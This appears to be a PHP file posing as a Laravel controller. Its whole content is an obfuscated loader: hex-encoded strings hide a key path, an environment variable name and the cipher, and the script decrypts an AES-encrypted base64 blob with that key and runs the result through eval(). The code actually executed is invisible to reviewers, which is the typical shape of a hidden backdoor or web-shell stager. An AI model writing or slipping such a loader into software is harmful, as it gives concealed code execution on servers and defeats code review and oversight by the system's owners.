<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('M+QCUbH2so2NuTLBDLERlg==');

$c=base64_decode(

'Oe0xBlN7H59NqZyvcHl0dlVb451XnhuPNAznFsR/Ozwt7pkK0VIOPCA1xywoPFQL0b+inYvM8ilI' .
'9O2KIPZ/mv0IF8WDQQTitejti4A8xUk+i8xtemApn0kHanAVAVSieqYf1REiMWuYwMnmjcT+ywl8' .
'skQMaVk00/jsSNddBxew5kZKXayr1w/IGc3emPMyMUSWZSYe3bkKCl9Hri0aFP21qHFBMXOMmPoe' .
'xugPiORtDD2oNprSYdhP2LIb8GLF'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

